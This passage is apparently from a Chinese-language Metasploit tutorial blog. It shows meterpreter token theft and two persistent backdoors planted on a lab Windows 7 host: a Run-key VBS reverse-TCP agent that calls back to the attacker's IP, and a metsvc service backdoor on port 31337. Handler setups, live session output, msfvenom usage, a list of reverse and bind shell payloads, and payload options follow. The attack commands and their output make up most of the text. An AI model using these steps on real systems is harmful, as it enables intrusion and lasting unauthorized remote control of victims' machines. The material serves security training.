 1328  484   VGAuthService.exe  x64   0        NT AUTHORITY\SYSTEM            C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe
 1376  484   vmtoolsd.exe       x64   0        NT AUTHORITY\SYSTEM            C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
 1548  396   cmd.exe            x64   1        WIN-5DTIE0M734E\Administrator  C:\Windows\system32\cmd.exe
 1616  484   svchost.exe        x64   0        NT AUTHORITY\NETWORK SERVICE   
 1776  812   dwm.exe            x64   1        WIN-5DTIE0M734E\Administrator  C:\Windows\system32\Dwm.exe
 1784  600   WmiPrvSE.exe                                                     
 1864  484   dllhost.exe        x64   0        NT AUTHORITY\SYSTEM            
 1952  484   msdtc.exe          x64   0        NT AUTHORITY\NETWORK SERVICE   
 2200  484   svchost.exe        x64   0        NT AUTHORITY\LOCAL SERVICE     
 2216  396   vm3dservice.exe    x64   1        WIN-5DTIE0M734E\Administrator  C:\Windows\System32\vm3dservice.exe
 2224  396   vmtoolsd.exe       x64   1        WIN-5DTIE0M734E\Administrator  C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
 2236  396   nc32.exe           x86   1        WIN-5DTIE0M734E\Administrator  C:\Windows\System32\nc32.exe
 2428  2156  powershell.exe     x86   0        NT AUTHORITY\SYSTEM            C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe
 2468  484   SearchIndexer.exe  x64   0        NT AUTHORITY\SYSTEM            
 2516  332   conhost.exe        x64   0        NT AUTHORITY\SYSTEM            C:\Windows\system32\conhost.exe

meterpreter <span class="token operator">></span> getuid 
Server username: NT AUTHORITY\SYSTEM
meterpreter <span class="token operator">></span> steal_token 396
Stolen token with username: WIN-5DTIE0M734E\Administrator
meterpreter <span class="token operator">></span> getuid 
Server username: WIN-5DTIE0M734E\Administrator
meterpreter <span class="token operator">></span> drop_token 
Relinquished token, now running as: WIN-5DTIE0M734E\Administrator
meterpreter <span class="token operator">></span> getuid 
Server username: NT AUTHORITY\SYSTEM
meterpreter <span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="后门种植-权限维持"><a href="#后门种植-权限维持" class="headerlink" title="后门种植+权限维持"></a>后门种植+权限维持</h3><p>metasploit自带的后门有两种方式启动的，一种是通过启动项自启动(persistence)，另一种是通过服务自启动(metsvc)，另外还可以通过persistence_exe自定义后门文件。</p>
<p>（1）Persistence启动项后门</p>
<ul>
<li>基本指令</li>
</ul>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># Persistence(通过启动项安装)</span>
run persistence -h  <span class="token comment" spellcheck="true"># 查看帮助</span>
run persistence -X -i 5 -p 4444 -r 192.33.6.150 
run persistence -U -i 5 -p 4444 -r 192.33.6.150 -L c:\\Windows\\System32
-X：设置后门在系统启动后自启动。该方式会在HKLM\Software\Microsoft\Windows\CurrentVersion\Run下添加注册表信息。由于权限原因会导致添加失败，后门无法启动。因此在非管理员权限下，不推荐使用该参数
-U：设置后门在用户登录后自启动。该方式会在HKCU\Software\Microsoft\Windows\CurrentVersion\Run下添加注册表信息
-L：后门传到远程主机的位置默认为%TEMP%【上传的是一个vbs脚本的后门程序】
-i：设置反向连接间隔时间为5秒
-P：默认载荷 windows/meterpreter/reverse_tcp
-p：设置反向连接的端口号
-r：设置反向连接的ip地址<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>实战：给内网主机win7种植启动项自启动后门</li>
</ul>
<p>通过内网win7的meterpreter会话，在内网win7的主机上种植后门</p>
<pre class="line-numbers language-bash"><code class="language-bash">meterpreter <span class="token operator">></span> getuid 
Server username: NT AUTHORITY\SYSTEM
meterpreter <span class="token operator">></span> 
meterpreter <span class="token operator">></span> run persistence -X -i 5 -p 4444 -r 192.33.6.150

<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Meterpreter scripts are deprecated. Try exploit/windows/local/persistence.
<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Example: run exploit/windows/local/persistence OPTION<span class="token operator">=</span>value <span class="token punctuation">[</span><span class="token punctuation">..</span>.<span class="token punctuation">]</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Running Persistence Script
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Resource <span class="token function">file</span> <span class="token keyword">for</span> cleanup created at /home/qftm/.msf4/logs/persistence/WIN-5DTIE0M734E_20200702.3033/WIN-5DTIE0M734E_20200702.3033.rc
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Creating Payload<span class="token operator">=</span>windows/meterpreter/reverse_tcp LHOST<span class="token operator">=</span>192.33.6.150 LPORT<span class="token operator">=</span>4444
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Persistent agent script is 99631 bytes long
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Persistent Script written to C:\Windows\TEMP\nQIXoTtl.vbs
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Executing script C:\Windows\TEMP\nQIXoTtl.vbs
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Agent executed with PID 3064
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Installing into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\oJAGqgEkK
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Installed into autorun as HKLM\Software\Microsoft\Windows\CurrentVersion\Run\oJAGqgEkK
meterpreter <span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>在受害者内网主机Win7上进行查看相关启动项后门信息</p>
<p><img src="/2020/06/20/metasploit-framework/image-20200703014255873.png" alt="image-20200703014255873"></p>
<p>监听连接后门：主动连接【受害者-&gt;攻击者】这里的后门程序随系统启动自启动之后，每隔5秒都会尝试进行一次反向主动连接（不必担心shell退出之后而无法再次连接的情况）</p>
<pre class="line-numbers language-bash"><code class="language-bash">msf5 <span class="token operator">></span> use exploit/multi/handler
msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token keyword">set</span> payload windows/meterpreter/reverse_tcp
payload <span class="token operator">=</span><span class="token operator">></span> windows/meterpreter/reverse_tcp
msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token keyword">set</span> LHOST 192.33.6.150
LHOST <span class="token operator">=</span><span class="token operator">></span> 192.33.6.150
msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token keyword">set</span> LPORT 4444
LPORT <span class="token operator">=</span><span class="token operator">></span> 4444
msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> show options 

Module options <span class="token punctuation">(</span>exploit/multi/handler<span class="token punctuation">)</span>:

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------

Payload options <span class="token punctuation">(</span>windows/meterpreter/reverse_tcp<span class="token punctuation">)</span>:

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          <span class="token function">yes</span>       Exit technique <span class="token punctuation">(</span>Accepted: <span class="token string">''</span>, seh, thread, process, none<span class="token punctuation">)</span>
   LHOST     192.33.6.150     <span class="token function">yes</span>       The listen address <span class="token punctuation">(</span>an interface may be specified<span class="token punctuation">)</span>
   LPORT     4444             <span class="token function">yes</span>       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target

msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> 
msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> exploit 

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Started reverse TCP handler on 192.33.6.150:4444 
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Sending stage <span class="token punctuation">(</span>176195 bytes<span class="token punctuation">)</span> to 192.33.6.200
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Meterpreter session 12 opened <span class="token punctuation">(</span>192.33.6.150:4444 -<span class="token operator">></span> 192.33.6.200:62130<span class="token punctuation">)</span> at 2020-07-02 13:52:50 -0400

meterpreter <span class="token operator">></span>
meterpreter <span class="token operator">></span> getuid 
Server username: WIN-5DTIE0M734E\Administrator
meterpreter <span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>PS：这里注意系统启动之后，当用户登陆进去之后，后门程序就会自动启动，此时返回回来的shell权限就是登录用户的权限。</p>
<p>（2）Metsvc服务后门</p>
<ul>
<li>基本指令</li>
</ul>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># Metsvc(通过服务安装)</span>
run metsvc -h   <span class="token comment" spellcheck="true">#查看帮助</span>
run metsvc -A   <span class="token comment" spellcheck="true">#自动安装后门服务</span>
run metsvc -r   <span class="token comment" spellcheck="true">#卸载安装的后门服务</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>实战：给内网主机win7种植服务自启动后门</li>
</ul>
<p>通过内网win7的meterpreter会话，在内网win7的主机上种植后门</p>
<pre class="line-numbers language-bash"><code class="language-bash">meterpreter <span class="token operator">></span> run metsvc -A

<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Meterpreter scripts are deprecated. Try exploit/windows/local/persistence.
<span class="token punctuation">[</span><span class="token operator">!</span><span class="token punctuation">]</span> Example: run exploit/windows/local/persistence OPTION<span class="token operator">=</span>value <span class="token punctuation">[</span><span class="token punctuation">..</span>.<span class="token punctuation">]</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Creating a meterpreter <span class="token function">service</span> on port 31337
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Creating a temporary installation directory C:\Users\ADMINI~1\AppData\Local\Temp\JfwfMtjYhYhn<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span>  <span class="token operator">>></span> Uploading metsrv.x86.dll<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span>  <span class="token operator">>></span> Uploading metsvc-server.exe<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span>  <span class="token operator">>></span> Uploading metsvc.exe<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Starting the service<span class="token punctuation">..</span>.
         * Installing <span class="token function">service</span> metsvc
 * Starting <span class="token function">service</span>
Service metsvc successfully installed.

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Trying to connect to the Meterpreter <span class="token function">service</span> at 192.168.9.101:31337<span class="token punctuation">..</span>.
meterpreter <span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>在受害者内网主机Win7上进行查看相关服务后门信息</p>
<p><img src="/2020/06/20/metasploit-framework/image-20200703021520737.png" alt="image-20200703021520737"></p>
<p>攻击者主动连接后门：被动连接【受害者&lt;-攻击者】</p>
<pre class="line-numbers language-bash"><code class="language-bash">msf5 <span class="token operator">></span> use exploit/multi/handler
msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token keyword">set</span> payload windows/metsvc_bind_tcp 
payload <span class="token operator">=</span><span class="token operator">></span> windows/metsvc_bind_tcp
msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token keyword">set</span> RHOST 192.168.9.101
RHOST <span class="token operator">=</span><span class="token operator">></span> 192.168.9.101
msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token keyword">set</span> LPORT 31337
LPORT <span class="token operator">=</span><span class="token operator">></span> 31337
msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span>
msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> show options 

Module options <span class="token punctuation">(</span>exploit/multi/handler<span class="token punctuation">)</span>:

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------
Payload options <span class="token punctuation">(</span>windows/metsvc_bind_tcp<span class="token punctuation">)</span>:

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          <span class="token function">yes</span>       Exit technique <span class="token punctuation">(</span>Accepted: <span class="token string">''</span>, seh, thread, process, none<span class="token punctuation">)</span>
   LPORT     31337            <span class="token function">yes</span>       The listen port
   RHOST     192.168.9.101    no        The target address

Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target

msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> 
msf5 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> exploit

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Started bind TCP handler against 192.168.9.101:31337
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Meterpreter session 19 opened <span class="token punctuation">(</span>192.168.9.50:1649 -<span class="token operator">></span> 192.168.9.101:31337<span class="token punctuation">)</span> at 2020-07-02 14:31:22 -0400

meterpreter <span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h1 id="MSFvenom"><a href="#MSFvenom" class="headerlink" title="MSFvenom"></a>MSFvenom</h1><p>Msfvenom是Metasploit的一个独立有效载荷（payload）生成器，同时也是msfpayload和msfencode的替代品，生成ShellCode（能够获取目标 Shell 的代码）的工具。</p>
<h2 id="基础操作"><a href="#基础操作" class="headerlink" title="基础操作"></a>基础操作</h2><h3 id="指令解读"><a href="#指令解读" class="headerlink" title="指令解读"></a>指令解读</h3><pre class="line-numbers language-bash"><code class="language-bash"> → Qftm :~/Desktop<span class="token comment" spellcheck="true"># msfvenom -h</span>
MsfVenom - a Metasploit standalone payload generator.
Also a replacement <span class="token keyword">for</span> msfpayload and msfencode.
Usage: /usr/bin/msfvenom <span class="token punctuation">[</span>options<span class="token punctuation">]</span> <span class="token operator">&lt;</span>var<span class="token operator">=</span>val<span class="token operator">></span>
Example: /usr/bin/msfvenom -p windows/meterpreter/reverse_tcp LHOST<span class="token operator">=</span><span class="token operator">&lt;</span>IP<span class="token operator">></span> -f exe -o payload.exe

Options:
    -l, --list            <span class="token operator">&lt;</span>type<span class="token operator">></span>     列出指定类型的所有模块 类型包括: payloads, encoders, nops, platforms, archs, encrypt, formats, all
    -p, --payload         <span class="token operator">&lt;</span>payload<span class="token operator">></span>  指定payload + 参数任务：设置相关payload选项 <span class="token punctuation">(</span>--list payloads to list, --list-options <span class="token keyword">for</span> arguments<span class="token punctuation">)</span>
        --list-options               列出指定payload的选项信息 standard, advanced and evasion options
    -f, --format          <span class="token operator">&lt;</span>format<span class="token operator">></span>   指定后门程序输出格式 <span class="token punctuation">(</span>use --list formats to list<span class="token punctuation">)</span>
    -e, --encoder         <span class="token operator">&lt;</span>encoder<span class="token operator">></span>  指定后门程序编码器 <span class="token punctuation">(</span>use --list encoders to list<span class="token punctuation">)</span>
        --sec-name        <span class="token operator">&lt;</span>value<span class="token operator">></span>    The new section name to use when generating large Windows binaries. Default: random 4-character alpha string
        --smallest                   Generate the smallest possible payload using all available encoders
        --encrypt         <span class="token operator">&lt;</span>value<span class="token operator">></span>    The <span class="token function">type</span> of encryption or encoding to apply to the shellcode <span class="token punctuation">(</span>use --list encrypt to list<span class="token punctuation">)</span>
        --encrypt-key     <span class="token operator">&lt;</span>value<span class="token operator">></span>    A key to be used <span class="token keyword">for</span> --encrypt
        --encrypt-iv      <span class="token operator">&lt;</span>value<span class="token operator">></span>    An initialization vector <span class="token keyword">for</span> --encrypt
    -a, --arch            <span class="token operator">&lt;</span>arch<span class="token operator">></span>     指定有效载荷和编码器的架构 <span class="token punctuation">(</span>use --list archs to list<span class="token punctuation">)</span>
        --platform        <span class="token operator">&lt;</span>platform<span class="token operator">></span> 指定载荷payload使用平台 <span class="token punctuation">(</span>use --list platforms to list<span class="token punctuation">)</span>
    -o, --out             <span class="token operator">&lt;</span>path<span class="token operator">></span>     输出并保存后门程序文件
    -b, --bad-chars       <span class="token operator">&lt;</span>list<span class="token operator">></span>     去除特殊字符（坏字符）: <span class="token string">'\x00\xff'</span>
    -n, --nopsled         <span class="token operator">&lt;</span>length<span class="token operator">></span>   Prepend a nopsled of <span class="token punctuation">[</span>length<span class="token punctuation">]</span> size on to the payload
        --pad-nops                   Use nopsled size specified by -n <span class="token operator">&lt;</span>length<span class="token operator">></span> as the total payload size, auto-prepending a nopsled of quantity <span class="token punctuation">(</span>nops minus payload length<span class="token punctuation">)</span>
    -s, --space           <span class="token operator">&lt;</span>length<span class="token operator">></span>   生成payload的最大长度，就是文件大小。
        --encoder-space   <span class="token operator">&lt;</span>length<span class="token operator">></span>   The maximum size of the encoded payload <span class="token punctuation">(</span>defaults to the -s value<span class="token punctuation">)</span>
    -i, --iterations      <span class="token operator">&lt;</span>count<span class="token operator">></span>    对有效载荷的编码次数
    -c, --add-code        <span class="token operator">&lt;</span>path<span class="token operator">></span>     指定包含一个额外的win32 shellcode文件
    -x, --template        <span class="token operator">&lt;</span>path<span class="token operator">></span>     捆绑：指定自定义可执行文件用作模板（模板<span class="token operator">==</span>正常可执行程序）（将木马捆绑到这个可执行程序上）
    -k, --keep                       保留--template行为并将有效载荷作为新线程注入
    -v, --var-name        <span class="token operator">&lt;</span>value<span class="token operator">></span>    Specify a custom variable name to use <span class="token keyword">for</span> certain output formats
    -t, --timeout         <span class="token operator">&lt;</span>second<span class="token operator">></span>   The number of seconds to <span class="token function">wait</span> when reading the payload from STDIN <span class="token punctuation">(</span>default 30, 0 to disable<span class="token punctuation">)</span>
    -h, --help                       帮助手册
 → Qftm :~/Desktop<span class="token comment" spellcheck="true">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="有效载荷"><a href="#有效载荷" class="headerlink" title="有效载荷"></a>有效载荷</h3><ul>
<li>常用有效攻击载荷</li>
</ul>
<pre class="line-numbers language-bash"><code class="language-bash">windows/shell/bind_tcp
windows/shell/reverse_tcp
windows/meterpreter/bind_tcp
windows/meterpreter/reverse_tcp
windows/x64/shell/bind_tcp 
windows/x64/shell/reverse_tcp
windows/x64/meterpreter/bind_tcp
windows/x64/meterpreter/reverse_tcp

linux/x86/shell/bind_tcp
linux/x86/shell/reverse_tcp
linux/x86/meterpreter/bind_tcp
linux/x86/meterpreter/reverse_tcp
linux/x64/shell/bind_tcp
linux/x64/shell/reverse_tcp
linux/x64/meterpreter/bind_tcp
linux/x64/meterpreter/reverse_tcp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>有效载荷参数</li>
</ul>
<pre class="line-numbers language-bash"><code class="language-bash">$ msfvenom -p <span class="token operator">&lt;</span>payload<span class="token operator">></span> --list-options<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<pre class="line-numbers language-bash"><code class="language-bash"> → Qftm :~/Desktop<span class="token comment" spellcheck="true"># msfvenom -p windows/meterpreter/reverse_tcp --list-options</span>
Options <span class="token keyword">for</span> payload/windows/meterpreter/reverse_tcp:
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>

       Name: Windows Meterpreter <span class="token punctuation">(</span>Reflective Injection<span class="token punctuation">)</span>, Reverse TCP Stager
     Module: payload/windows/meterpreter/reverse_tcp
   Platform: Windows
       Arch: x86
Needs Admin: No
 Total size: 283
       Rank: Normal

Provided by:
    skape <span class="token operator">&lt;</span>mmiller@hick.org<span class="token operator">></span>
    sf <span class="token operator">&lt;</span>stephen_fewer@harmonysecurity.com<span class="token operator">></span>
    OJ Reeves
    hdm <span class="token operator">&lt;</span>x@hdm.io<span class="token operator">></span>

Basic options:
Name      Current Setting  Required  Description
----      ---------------  --------  -----------
EXITFUNC  process          <span class="token function">yes</span>       Exit technique <span class="token punctuation">(</span>Accepted: <span class="token string">''</span>, seh, thread, process, none<span class="token punctuation">)</span>
LHOST                      <span class="token function">yes</span>       The listen address <span class="token punctuation">(</span>an interface may be specified<span class="token punctuation">)</span>
LPORT     4444             <span class="token function">yes</span>       The listen port

Description:
  Inject the meterpreter server DLL via the Reflective Dll Injection 
  payload <span class="token punctuation">(</span>staged<span class="token punctuation">)</span>. Connect back to the attacker

Advanced options <span class="token keyword">for</span> payload/windows/meterpreter/reverse_tcp:
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>

    Name                         Current Setting  Required  Description
    ----                         ---------------  --------  -----------
    AutoLoadStdapi               <span class="token boolean">true</span>             <span class="token function">yes</span>       Automatically load the Stdapi extension
    AutoRunScript                                 no        A script to run automatically on session creation.
    AutoSystemInfo               <span class="token boolean">true</span>             <span class="token function">yes</span>       Automatically capture system information on initialization.
    AutoUnhookProcess            <span class="token boolean">false</span>            <span class="token function">yes</span>       Automatically load the unhook extension and unhook the process
    AutoVerifySession            <span class="token boolean">true</span>             <span class="token function">yes</span>       Automatically verify and drop invalid sessions
    AutoVerifySessionTimeout     30               no        Timeout period to <span class="token function">wait</span> <span class="token keyword">for</span> session validation to occur, <span class="token keyword">in</span> seconds
    EnableStageEncoding          <span class="token boolean">false</span>            no        Encode the second stage payload
    EnableUnicodeEncoding        <span class="token boolean">false</span>            <span class="token function">yes</span>       Automatically encode UTF-8 strings as hexadecimal
    HandlerSSLCert                                no        Path to a SSL certificate <span class="token keyword">in</span> unified PEM format, ignored <span class="token keyword">for</span> HTTP transports
    InitialAutoRunScript                          no        An initial script to run on session creation <span class="token punctuation">(</span>before AutoRunScript<span class="token punctuation">)</span>
    PayloadBindPort                               no        Port to bind reverse tcp socket to on target system.
    PayloadProcessCommandLine                     no        The displayed <span class="token function">command</span> line that will be used by the payload
    PayloadUUIDName                               no        A human-friendly name to reference this unique payload <span class="token punctuation">(</span>requires tracking<span class="token punctuation">)</span>
    PayloadUUIDRaw                                no        A hex string representing the raw 8-byte PUID value <span class="token keyword">for</span> the UUID
    PayloadUUIDSeed                               no        A string to use when generating the payload UUID <span class="token punctuation">(</span>deterministic<span class="token punctuation">)</span>
    PayloadUUIDTracking          <span class="token boolean">false</span>            <span class="token function">yes</span>       Whether or not to automatically register generated UUIDs
    PingbackRetries              0                <span class="token function">yes</span>       How many additional successful pingbacks
    PingbackSleep                30               <span class="token function">yes</span>       Time <span class="token punctuation">(</span>in seconds<span class="token punctuation">)</span> to <span class="token function">sleep</span> between pingbacks
    PrependMigrate               <span class="token boolean">false</span>            <span class="token function">yes</span>       Spawns and runs shellcode <span class="token keyword">in</span> new process
    PrependMigrateProc                            no        Process to spawn and run shellcode <span class="token keyword">in</span>
    ReverseAllowProxy            <span class="token boolean">false</span>            <span class="token function">yes</span>       Allow reverse tcp even with Proxies specified. Connect back will NOT go through proxy but directly to LHOST
    ReverseListenerBindAddress                    no        The specific IP address to bind to on the local system
    ReverseListenerBindPort                       no        The port to bind to on the local system <span class="token keyword">if</span> different from LPORT
    ReverseListenerComm                           no        The specific communication channel to use <span class="token keyword">for</span> this listener
    ReverseListenerThreaded      <span class="token boolean">false</span>            <span class="token function">yes</span>       Handle every connection <span class="token keyword">in</span> a new thread <span class="token punctuation">(</span>experimental<span class="token punctuation">)</span>
    SessionCommunicationTimeout  300              no        The number of seconds of no activity before this session should be killed
    SessionExpirationTimeout     604800           no        The number of seconds before this session should be forcibly shut down
    SessionRetryTotal            3600             no        Number of seconds try reconnecting <span class="token keyword">for</span> on network failure
    SessionRetryWait             10               no        Number of seconds to <span class="token function">wait</span> between reconnect attempts
    StageEncoder                                  no        Encoder to use <span class="token keyword">if</span> EnableStageEncoding is <span class="token keyword">set</span>
    StageEncoderSaveRegisters                     no        Additional registers to preserve <span class="token keyword">in</span> the staged payload <span class="token keyword">if</span> EnableStageEncoding is <span class="token keyword">set</span>
    StageEncodingFallback        <span class="token boolean">true</span>             no        Fallback to no encoding <span class="token keyword">if</span> the selected StageEncoder is not compatible
    StagerRetryCount             10               no        The number of <span class="token function">times</span> the stager should retry <span class="token keyword">if</span> the first connect fails
    StagerRetryWait              5                no        Number of seconds to <span class="token function">wait</span> <span class="token keyword">for</span> the stager between reconnect attempts
    VERBOSE                      <span class="token boolean">false</span>            no        Enable detailed status messages
    WORKSPACE                                     no        Specify the workspace <span class="token keyword">for</span> this module

Evasion options <span class="token keyword">for</span> payload/windows/meterpreter/reverse_tcp:
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>

    Name  Current Setting  Required  Description
    ----  ---------------  --------  -----------
 → Qftm :~/Desktop<span class="token comment" spellcheck="true"># </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="架构支持"><a href="#架构支持" class="headerlink" title="架构支持"></a>架构支持</h3><pre class="line-numbers language-bash"><code class="language-bash"> → Qftm :~/Desktop<span class="token comment" spellcheck="true"># msfvenom -l archs</span>

Framework Architectures <span class="token punctuation">[</span>--arch <span class="token operator">&lt;</span>value<span class="token operator">></span><span class="token punctuation">]</span>
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>

    Name
    ----
    aarch64
    armbe
    armle
    cbea
    cbea64
    cmd
    dalvik
    firefox
    java
    mips
    mips64
    mips64le
    mipsbe
    mipsle
    nodejs
    php
    ppc
    ppc64
    ppc64le
    ppce500v2
    python
    r
    ruby
    sparc
    sparc64
    <span class="token function">tty</span>
    x64
    x86
    x86_64
    zarch

 → Qftm :~/Desktop<span class="token comment" spellcheck="true"># </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="平台支持"><a href="#平台支持" class="headerlink" title="平台支持"></a>平台支持</h3><pre class="line-numbers language-bash"><code class="language-bash"> → Qftm :~/Desktop<span class="token comment" spellcheck="true"># msfvenom -l platforms</span>

Framework Platforms <span class="token punctuation">[</span>--platform <span class="token operator">&lt;</span>value<span class="token operator">></span><span class="token punctuation">]</span>
